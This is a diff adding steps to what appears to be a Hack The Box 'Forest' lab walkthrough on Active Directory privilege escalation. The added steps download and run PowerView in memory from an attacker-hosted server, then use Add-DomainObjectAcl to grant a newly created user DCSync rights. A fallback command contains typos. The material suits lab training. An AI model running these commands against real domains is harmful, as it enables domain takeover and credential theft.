@@ -307,6 +307,24 @@ C:\> net user random passwd123 /add /domain
 ```CSS
 C:\> net group "Exchange Windows Permissions" random /add /domain
 ```
+  - Start a python local server on the attacker machine.
+  - Download `PowerView.ps1` on Forest.
+```CSS
+C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.28/PowerView.ps1')
+```
+  - Use the Add-DomainObjectAcl function in PowerView to give the user DCSync privileges.
+  - This is possible because the user is a part of the Exchange Windows Permissions group which has WriteDacl permission on the htb.local domain.
+```CSS
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $pass = convertto-securestring 'passwd123' -asplain -force
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $cred = New-Object System.Management.Automation.PSCredential('htb\random', $pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity random -Rights DCSync
+---
+## If the above command does not work try the below. Sometimes it is necessary to specify the target in a different way.
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-DomainObjectAcl -Credentials $cred – TargetIdentity htb.local -PrincipalIdentity random -Rights DCSync
+```
+![image](https://user-images.githubusercontent.com/83878909/231679673-783389bb-0226-414b-97fc-673e3f8d516f.png)
+
+
   - Give the user DcSync privileges.
   - This is possible because the user is a part of the Exchange Windows Permissions group which has WriteDacl permission on the htb.local domain.
 ```CSS
